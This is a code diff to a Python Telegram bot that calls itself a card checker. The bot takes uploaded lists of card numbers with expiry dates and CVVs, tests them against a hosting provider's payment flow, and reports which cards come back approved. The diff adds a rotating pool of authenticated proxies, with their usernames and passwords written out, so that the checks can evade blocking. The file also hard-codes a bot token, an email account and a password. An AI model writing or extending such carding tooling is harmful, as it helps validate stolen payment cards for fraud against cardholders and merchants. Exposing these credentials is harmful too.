@@ -16,6 +16,45 @@ import re
 BOT_TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
 ADMIN_IDS = [5895491379,844663875]
 
+# ========== Proxy List ==========
+PROXY_LIST = [
+    "82.26.221.169:5510:bxnvwevk:utgavp02z833",
+    "82.29.225.10:5865:bxnvwevk:utgavp02z833",
+    "82.22.220.181:5536:bxnvwevk:utgavp02z833",
+    "82.21.224.74:6430:bxnvwevk:utgavp02z833",
+    "82.29.230.232:7073:bxnvwevk:utgavp02z833",
+    "82.25.216.145:6987:bxnvwevk:utgavp02z833",
+    "82.25.216.194:7036:bxnvwevk:utgavp02z833",
+    "82.27.214.60:6402:bxnvwevk:utgavp02z833",
+    "82.24.224.197:5553:bxnvwevk:utgavp02z833",
+    "82.22.220.108:5463:bxnvwevk:utgavp02z833",
+    "23.27.138.233:6334:bxnvwevk:utgavp02z833",
+]
+
+current_proxy_index = 0
+
+def get_next_proxy():
+    """الحصول على البروكسي التالي بشكل دوري"""
+    global current_proxy_index
+    proxy_str = PROXY_LIST[current_proxy_index]
+    current_proxy_index = (current_proxy_index + 1) % len(PROXY_LIST)
+    
+    # تحويل الصيغة ip:port:user:pass إلى قاموس
+    parts = proxy_str.split(':')
+    ip = parts[0]
+    port = parts[1]
+    username = parts[2]
+    password = parts[3]
+    
+    proxy_dict = {
+        'http': f'http://{username}:{password}@{ip}:{port}',
+        'https': f'http://{username}:{password}@{ip}:{port}'
+    }
+    
+    proxy_display = f"{ip}:{port}"
+    
+    return proxy_dict, proxy_display
+
 # بيانات تسجيل الدخول
 USERNAME = "lepsehimlu1@gmail.com"
 PASSWORD = "111222333Mm"
@@ -58,7 +97,8 @@ stats = {
     'current_card': '',
     'error_details': {},
     'last_response': 'Waiting...',
-    'cards_checked': 0,  # عداد البطاقات المفحوصة
+    'cards_checked': 0,
+    'current_proxy': 'Initializing...',
 }
 
 # ========== دالات تحديث الكوكيز ==========
@@ -78,6 +118,11 @@ def login_and_get_cookies():
     """تسجيل الدخول وجلب الكوكيز المهمة"""
     try:
         with requests.Session() as s:
+            # استخدام بروكسي عشوائي للتسجيل
+            proxy_dict, proxy_display = get_next_proxy()
+            s.proxies.update(proxy_dict)
+            print(f"[🌐] استخدام بروكسي للتسجيل: {proxy_display}")
+            
             csrf_token = get_csrf_and_cookies(s)
             if not csrf_token:
                 print("[!] فشل في الحصول على CSRF Token")
@@ -147,6 +192,12 @@ def generate_guid():
 
 def create_fresh_session():
     session = requests.Session()
+    
+    # إضافة البروكسي للسيشن
+    proxy_dict, proxy_display = get_next_proxy()
+    session.proxies.update(proxy_dict)
+    stats['current_proxy'] = proxy_display
+    
     session.cookies.update(BASE_COOKIES)
     
     muid = f"{generate_guid()}{generate_random_string(6)}"
@@ -383,11 +434,11 @@ async def send_result(bot_app, card, status_type, message):
             card_number = stats['approved'] + stats['auth_attempted'] + stats['secure_3d']
             
             if status_type == 'APPROVED':
-                text = f"━━━━━━━━━━━━━━━\n✅ APPROVED CARD LIVE ✅\n━━━━━━━━━━━━━━━\n💳 {card}\n🔥 Status: Approved\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n━━━━━━━━━━━━━━━"
+                text = f"━━━━━━━━━━━━━━━\n✅ APPROVED CARD LIVE ✅\n━━━━━━━━━━━━━━━\n💳 {card}\n🔥 Status: Approved\n📊 Card #{card_number}\n🌐 Proxy: {stats['current_proxy']}\n⚡️ Mahmoud Saad\n━━━━━━━━━━━━━━━"
             elif status_type == 'AUTH_ATTEMPTED':
-                text = f"╔═══════════════╗\n🔄 AUTH ATTEMPTED CARD 🔄\n╚═══════════════╝\n💳 {card}\n🔥 Status: Auth Attempted\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
+                text = f"╔═══════════════╗\n🔄 AUTH ATTEMPTED CARD 🔄\n╚═══════════════╝\n💳 {card}\n🔥 Status: Auth Attempted\n📊 Card #{card_number}\n🌐 Proxy: {stats['current_proxy']}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
             else:
-                text = f"┏━━━━━━━━━━━━━━━┓\n⚠️ 3D SECURE CARD ⚠️\n┗━━━━━━━━━━━━━━━┛\n💳 {card}\n🔥 Status: 3D Secure\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n┗━━━━━━━━━━━━━━━┛"
+                text = f"┏━━━━━━━━━━━━━━━┓\n⚠️ 3D SECURE CARD ⚠️\n┗━━━━━━━━━━━━━━━┛\n💳 {card}\n🔥 Status: 3D Secure\n📊 Card #{card_number}\n🌐 Proxy: {stats['current_proxy']}\n⚡️ Mahmoud Saad\n┗━━━━━━━━━━━━━━━┛"
             
             await bot_app.bot.send_message(chat_id=stats['chat_id'], text=text)
         except:
@@ -419,6 +470,9 @@ def create_dashboard_keyboard():
         ],
         [
             InlineKeyboardButton(f"📡 Response: {stats['last_response']}", callback_data="response")
+        ],
+        [
+            InlineKeyboardButton(f"🌐 Proxy: {stats['current_proxy']}", callback_data="proxy")
         ]
     ]
     
@@ -443,7 +497,7 @@ async def update_dashboard(bot_app):
             await bot_app.bot.edit_message_text(
                 chat_id=stats['chat_id'],
                 message_id=stats['dashboard_message_id'],
-                text="📊 **KNOWNHOST CARD CHECKER** 📊",
+                text="📊 **KNOWNHOST CARD CHECKER - ROTATING PROXIES** 📊",
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
@@ -464,9 +518,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
-        "📊 **KNOWNHOST CARD CHECKER BOT**\n\n"
+        "📊 **KNOWNHOST CARD CHECKER BOT - ROTATING PROXIES**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
-        "الصيغة: `رقم|شهر|سنة|cvv`",
+        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
+        f"🌐 عدد البروكسيات: {len(PROXY_LIST)}\n"
+        "🔄 كل طلب يستخدم بروكسي مختلف",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -500,17 +556,26 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats['current_card'] = ''
     stats['error_details'] = {}
     stats['last_response'] = 'Starting...'
-    stats['cards_checked'] = 0  # إعادة تعيين العداد
+    stats['cards_checked'] = 0
+    stats['current_proxy'] = 'Initializing...'
     stats['start_time'] = datetime.now()
     stats['is_running'] = True
     stats['chat_id'] = update.effective_chat.id
     
     dashboard_msg = await update.message.reply_text(
-        "📊 **KNOWNHOST CARD CHECKER** 📊",
+        "📊 **KNOWNHOST CARD CHECKER - ROTATING PROXIES** 📊",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
     stats['dashboard_message_id'] = dashboard_msg.message_id
+    
+    await update.message.reply_text(
+        f"✅ تم بدء الفحص!\n\n"
+        f"📊 إجمالي البطاقات: {len(cards)}\n"
+        f"🌐 البروكسيات المتاحة: {len(PROXY_LIST)}\n"
+        f"📢 تابع النتائج أدناه",
+        parse_mode='Markdown'
+    )
     
     def run_checker():
         loop = asyncio.new_event_loop()
@@ -581,6 +646,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update_dashboard(context.application)
 
 def main():
+    print("[🤖] Starting KnownHost Telegram Bot - Rotating Proxies...")
+    print(f"[🌐] Loaded {len(PROXY_LIST)} proxies")
+    
     app = Application.builder().token(BOT_TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
@@ -588,7 +656,7 @@ def main():
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(CallbackQueryHandler(button_callback))
     
-    print("🤖 البوت يعمل...")
+    print("[✅] Bot is running with rotating proxies...")
     app.run_polling()
 
 if __name__ == "__main__":
